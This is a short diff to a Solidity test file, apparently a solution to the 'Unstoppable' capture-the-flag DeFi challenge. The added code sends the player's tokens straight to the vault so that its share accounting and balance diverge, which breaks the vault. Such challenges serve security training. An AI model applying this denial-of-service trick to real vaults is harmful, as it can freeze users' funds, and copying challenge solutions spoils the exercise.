@@ -91,7 +91,8 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        
+        // Send tokens to Vault directly, causing the shares and its asset balance to go out of sync
+        token.transfer(address(vault), token.balanceOf(player));
     }
 
     /**
